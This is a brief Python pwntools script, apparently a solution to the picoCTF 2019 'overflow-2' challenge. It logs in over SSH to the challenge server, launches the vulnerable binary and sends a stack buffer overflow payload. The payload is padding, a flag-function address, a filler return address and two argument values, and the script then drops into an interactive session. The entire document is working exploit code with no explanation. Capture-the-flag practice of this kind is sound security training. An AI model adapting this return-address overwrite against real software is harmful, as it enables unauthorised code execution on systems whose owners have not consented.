from pwn import *

host = '2019shell1.picoctf.com'
user = ''
password = ''

func_flag_addr = 0x080485e6
cwd = '/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e'
filename = 'vuln'

ssh = ssh(host = host, user = user, password = password)
s = ssh.process(filename, cwd = cwd)

arg1 = 0xDEADBEEF
arg2 = 0xC0DED00D
payload = b'a' * (176 + 12) + p32(func_flag_addr) + b'a' * 4 + p32(arg1) + p32(arg2)
s.sendlineafter(': \n', payload)
s.interactive()
